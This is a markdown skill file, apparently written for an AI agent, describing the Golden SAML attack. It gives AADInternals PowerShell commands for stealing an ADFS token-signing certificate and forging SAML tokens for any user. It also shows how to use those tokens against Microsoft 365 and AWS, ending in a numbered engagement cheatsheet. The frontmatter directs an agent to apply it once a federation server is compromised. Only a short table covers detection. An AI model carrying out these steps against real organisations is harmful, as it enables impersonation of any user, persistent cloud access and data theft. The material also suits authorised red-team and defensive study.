---
name: offensive-golden-saml
description: "Golden SAML attack methodology — token-signing certificate theft from ADFS / federation servers, forging SAML assertions for any user against any SP that trusts the IdP. Use when ADFS or comparable federation server is compromised or the token-signing cert is otherwise obtained — provides persistent post-rotation access to cloud services."
---

# Golden SAML

When you steal the token-signing cert from a federation server, you can forge a SAML assertion for any user — at any SP that trusts that IdP.

## Token-Signing Cert Theft

ADFS stores the cert in:
- DKM (Data Key Manager) container in AD (encrypted)
- Local certificate store on ADFS server
- Backup files (sometimes weaker ACL than live cert)

```powershell
# AADInternals — extract from running ADFS server
Get-AADIntADFSTokenSigningCertificate -ServerName adfs.corp.local -CertOnly | \
  Export-AADIntADFSCertificate -OutputFolder ./

# Or via DKM (offline if DC compromised)
Get-AADIntADFSDKMKey -ServerName adfs.corp.local
```

## Forge SAML Assertion

```powershell
New-AADIntSAMLToken \
  -ImmutableID '<base64-of-target-objectGUID>' \
  -Issuer 'http://adfs.corp.local/adfs/services/trust' \
  -PfxFileName 'token-signing.pfx' \
  -SAMLNameID 'admin@corp.local'
```

The forged token works against any SP federated with that ADFS instance.

## Pivot Targets

| SP | Impact |
|---|---|
| Microsoft 365 | Mailbox / SharePoint / Teams as any user |
| Salesforce | Customer data, integrations |
| AWS (SAML federation) | Console access, role assumption |
| ServiceNow / ITSM | Ticket modification, asset control |
| Internal apps | Any app federated to this ADFS |

## Use the Forged Token

```bash
# Inject into cloud session
# For Microsoft 365: use AADInternals' Open-AADIntOffice365Portal
Open-AADIntOffice365Portal -AccessToken (Get-AADIntAccessTokenForAADGraph -SAMLToken $token)

# For AWS via SAML
aws sts assume-role-with-saml --role-arn ... --principal-arn ... --saml-assertion <base64>
```

## Persistence

- Token-signing cert rotation is rare and requires explicit admin action
- Once acquired, persistence is automatic until rotation
- Rotation logged but not always alerted

## Detection

| Signal | Defender View |
|---|---|
| Sign-in event with no corresponding ADFS log | Detection requires log correlation between ADFS and cloud |
| Sign-in from unusual IP for the user | Identity Protection / Risky Sign-In |
| New federated trust principal | AAD Audit |

Detection of Golden SAML requires ADFS log forwarding to a SIEM and correlation with cloud sign-in events. Many environments don't do this.

## Engagement Cheatsheet

```powershell
# 1. Identify ADFS server (tenant federation domain)
Get-AADIntTenantInformation -Domain target.com

# 2. Compromise ADFS server (any admin path)

# 3. Extract cert
Get-AADIntADFSTokenSigningCertificate -ServerName adfs.target.com

# 4. Forge SAML for target user
New-AADIntSAMLToken -ImmutableID <id> -PfxFileName token.pfx \
  -Issuer 'http://adfs.target.com/...' -SAMLNameID admin@target.com

# 5. Use against M365 / Salesforce / AWS / etc.

# 6. Document: cert source, target SPs, persistence achieved
```

## Key References

- "Golden SAML" (Sygnia)
- AADInternals: aadinternals.com
- Solorigate / SUNBURST attribution research (Golden SAML at scale)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/golden-saml.md
